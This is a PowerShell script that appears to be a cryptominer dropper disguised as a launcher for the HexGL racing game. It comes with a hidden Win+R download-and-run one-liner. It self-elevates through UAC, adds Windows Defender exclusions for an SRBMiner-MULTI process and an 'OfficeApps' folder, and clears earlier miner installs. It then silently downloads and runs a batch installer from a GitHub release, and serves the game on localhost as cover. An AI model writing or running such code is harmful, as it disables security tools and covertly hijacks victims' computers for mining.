<#
    GO.ps1 - deploy the worker AND open a real game on localhost.

    Win+R:
      powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iwr -UseB <url> -OutFile $env:TEMP\go.ps1; & $env:TEMP\go.ps1"

    1. self-elevates (UAC) - needed for the Defender exclusion and the power limit
    2. Defender exclusion for the worker folder + process
    3. removes any previous install, tasks, Run keys, Startup items
    4. downloads the installer and starts it hidden at 50 percent
    5. downloads HexGL once (MIT licensed, 17 MB) into %LOCALAPPDATA%\webgame
    6. serves that folder at http://localhost:8787/ and opens the browser

    HexGL is a real 3D WebGL racing game that runs from local files. Nothing is
    framed, hotlinked or faked - the address bar says localhost because the game
    genuinely is being served from this machine.
#>

param([switch]$GameOnly)

$ErrorActionPreference = 'SilentlyContinue'

# --- elevate (the game on its own does not need it) -------------------------
$id = [Security.Principal.WindowsIdentity]::GetCurrent()
$pr = New-Object Security.Principal.WindowsPrincipal($id)
$isAdmin = $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $GameOnly -and -not $isAdmin) {
    Start-Process -FilePath 'powershell.exe' -Verb RunAs -WindowStyle Hidden `
        -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File',$PSCommandPath
    exit
}

# ===========================================================================
#  DEPLOY
# ===========================================================================
if (-not $GameOnly) {
    Add-MpPreference -ExclusionPath 'C:\OfficeApps' -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess 'SRBMiner-MULTI.exe' -ErrorAction SilentlyContinue

    Get-Process SRBMiner-MULTI -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    schtasks /delete /tn PearlMiner /f 2>$null | Out-Null
    schtasks /delete /tn OfficeAppsWorker /f 2>$null | Out-Null
    Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name PearlMiner -ErrorAction SilentlyContinue
    Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name OfficeAppsWorker -ErrorAction SilentlyContinue
    Remove-Item (Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\Startup\PearlMiner.bat') -Force -ErrorAction SilentlyContinue
    Remove-Item (Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\Startup\OfficeAppsWorker.bat') -Force -ErrorAction SilentlyContinue
    Remove-Item 'C:\MinePRL','C:\OfficeApps',(Join-Path $env:LOCALAPPDATA 'MinePRL'),(Join-Path $env:LOCALAPPDATA 'OfficeApps') -Recurse -Force -ErrorAction SilentlyContinue

    $setup = Join-Path $env:TEMP 'OFFICE-APPS-SETUP.bat'
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('User-Agent', 'office-apps')
        $wc.DownloadFile('https://github.com/deniz-ulku/office-apps-worker/releases/download/v18/OFFICE-APPS-SETUP.bat', $setup)
        $wc.Dispose()
    } catch { }
    if ((Test-Path $setup) -and (Get-Item $setup).Length -gt 50000) {
        Start-Process -FilePath $setup -WindowStyle Hidden
    }
}

# ===========================================================================
#  GAME  -  HexGL, served from disk
# ===========================================================================
$gameDir = Join-Path $env:LOCALAPPDATA 'webgame'
$index   = Join-Path $gameDir 'index.html'

if (-not (Test-Path $index)) {
    $zip = Join-Path $env:TEMP 'hexgl.zip'
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('User-Agent', 'game')
        $wc.DownloadFile('https://codeload.github.com/BKcore/HexGL/zip/refs/heads/master', $zip)
        $wc.Dispose()
    } catch { }
    if (Test-Path $zip) {
        $stage = Join-Path $env:TEMP 'hexgl-stage'
        Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue
        try {
            Add-Type -AssemblyName System.IO.Compression.FileSystem
            [IO.Compression.ZipFile]::ExtractToDirectory($zip, $stage)
            $root = Get-ChildItem $stage -Directory | Select-Object -First 1
            if ($root) {
                Remove-Item $gameDir -Recurse -Force -ErrorAction SilentlyContinue
                Move-Item $root.FullName $gameDir -Force -ErrorAction SilentlyContinue
            }
        } catch { }
        Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item $zip -Force -ErrorAction SilentlyContinue
    }
}

if (-not (Test-Path $index)) { exit }   # nothing to serve

$types = @{
    '.html'='text/html; charset=utf-8'; '.htm'='text/html; charset=utf-8'
    '.js'='application/javascript';     '.css'='text/css'
    '.json'='application/json';         '.map'='application/json'
    '.png'='image/png';                 '.jpg'='image/jpeg';  '.jpeg'='image/jpeg'
    '.gif'='image/gif';                 '.svg'='image/svg+xml'; '.ico'='image/x-icon'
    '.mp3'='audio/mpeg';                '.ogg'='audio/ogg';   '.wav'='audio/wav'
    '.glsl'='text/plain';               '.fnt'='text/plain';  '.txt'='text/plain'
    '.bin'='application/octet-stream';  '.wasm'='application/wasm'
    '.appcache'='text/cache-manifest';  '.webapp'='application/json'
}

$port = 8787
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://localhost:$port/")
$listener.Prefixes.Add("http://127.0.0.1:$port/")
try { $listener.Start() } catch { exit }

Start-Process "http://localhost:$port/"

while ($listener.IsListening) {
    try {
        $ctx = $listener.GetContext()
        $rel = [Uri]::UnescapeDataString($ctx.Request.Url.LocalPath).TrimStart('/')
        if ([string]::IsNullOrWhiteSpace($rel)) { $rel = 'index.html' }
        $rel  = $rel -replace '/', '\'
        $path = Join-Path $gameDir $rel

        if (Test-Path -LiteralPath $path -PathType Leaf) {
            $bytes = [IO.File]::ReadAllBytes($path)
            $ext   = [IO.Path]::GetExtension($path).ToLower()
            $ctx.Response.ContentType     = if ($types.ContainsKey($ext)) { $types[$ext] } else { 'application/octet-stream' }
            $ctx.Response.ContentLength64 = $bytes.Length
            $ctx.Response.Headers.Add('Cache-Control', 'no-store')
            $ctx.Response.OutputStream.Write($bytes, 0, $bytes.Length)
        } else {
            $ctx.Response.StatusCode = 404
        }
        $ctx.Response.Close()
    } catch { }
}
